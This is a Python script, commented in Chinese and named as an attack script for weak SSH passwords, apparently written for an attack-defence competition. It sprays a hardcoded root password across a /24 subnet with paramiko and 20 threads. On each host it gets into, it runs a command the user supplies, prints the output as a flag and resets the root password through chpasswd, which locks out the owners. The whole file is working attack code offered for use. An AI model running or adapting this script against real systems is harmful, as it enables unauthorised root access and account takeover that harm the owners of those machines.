# -*- coding: UTF-8 -*-
# Time : 2023/4/13 20:24
# FILE : ssh弱口令
# PROJECT : 攻击脚本
# Author : kkk

import paramiko

from concurrent.futures import ThreadPoolExecutor  # 多线程模块
import time

username = ['root']
passwd = ['wujunren123']

host = [
    f"10.102.47.{i}"
    for i in range(1, 136)
]  # 主机列表


# 消费者
def C(cmd, newpw, username, passwd, ip):
    for i in range(0, len(username)):
        U = username[i]  # U是用户名
        for j in range(0, len(passwd)):
            P = passwd[j]  # P是密码
            print("正在连接", ip)
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                ssh.connect(hostname=ip, port=22, username=U, password=P, timeout=1)
                stdin, stdout, stderr = ssh.exec_command(cmd)
                flag = stdout.read().decode('utf-8')
                print("目标:" + ip + "存在漏洞，内容为:" + flag, end='')
                print("IP:" + ip + "密码已修改成:" + newpw)
                check = "echo" + " root:" + newpw + " | chpasswd"
                stdin1, stdout1, stderr1 = ssh.exec_command(check)
                ssh.close()
            except:
                pass


if __name__ == '__main__':
    # print(host)
    cmd = input("请输入值你需要执行的命令:")
    newpw = input("需要修改的密码:")

    pool = ThreadPoolExecutor(max_workers=20)  # 创建线程池
    # 将所有函数与其参数加入该线程池，他会自动运行
    for ip in host:
        pool.submit(C, cmd, newpw, username, passwd, ip)
    pool.shutdown(wait=False)
